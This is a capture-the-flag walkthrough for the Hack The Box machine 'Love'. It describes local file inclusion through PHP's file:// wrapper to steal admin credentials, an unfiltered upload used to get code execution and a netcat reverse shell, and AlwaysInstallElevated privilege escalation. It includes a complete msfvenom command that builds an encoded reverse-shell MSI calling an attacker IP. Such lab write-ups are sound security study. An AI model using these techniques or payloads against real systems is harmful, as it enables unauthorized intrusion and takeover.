 Summary
- Takeaways:
	- make sure to check "commonName" field on SSL certificates for possible vhosts or subdomains if port 443 is open
- User: find vhost from SSL certificate, LFI using PHP wrapper to enumerate root web directory and retrieve admin creds, login with admin creds and upload PHP file to achieve RCE
- Root: user has AlwaysInstallElevated privileges allowing them to install a malicious MSI file that executes a reverse shell

# Details
### User
- scan reveals several ports including port 80 open
- automated enumeration scans don't reveal anything, and the website on port 80 only displays a login form for a voting website
- `nmap` shows the SSL certificate has "commonName" field of "staging.love.htb"
- adding this to the hosts file shows it to be a file scanner service that takes a URL, scans it, and then send it back
- service can be used for LFI by using the `file://` PHP wrapper
	- `file://C:/xampp/apache/logs/access.log`, confirms LFI
	- `file://C:/xampp/apache/conf/extra/httpd-vhosts.conf`, reveals directory structure for webroot, showing the existence of `passwordmanager` within `htdocs`
	- `file://C:/xampp/htdocs/passwordmanager/`, reveals creds.txt exists
	- `file://C:/xampp/htdocs/passwordmanager/creds.txt`, get admin creds
- can then use the creds to log into the voting website as the admin which gives you the ability to create new voters and upload profile pictures
- profile pictures aren't checked or filtered, so it's possible to upload PHP source files and then retrieve them at `http://love.htb/images/<file>`
- can also use the upload functionality to place `nc64.exe` on the server and then use a PHP file to execute it and open a reverse shell giving access as the user `phoebe`
- https://www.php.net/manual/en/wrappers.file.php
- https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
- http://www.build-your-website.co.uk/install-configure-xampp-windows/

### Root
- uploading `winpeas.exe` and running reveals that the user has both of the required permissions to have AlwaysInstallElevated capability
- this allows them to install MSI files with elevated privileges, so it's possible to use `msfvenom` to construct a malicious MSI file that will spawn a reverse shell as `NT Authority\SYSTEM` whenever it's executed
- `msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.124 LPORT=9999 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi`
- https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path
- https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated

#### Tags: LFI, PHP wrappers, AlwaysInstallElevated
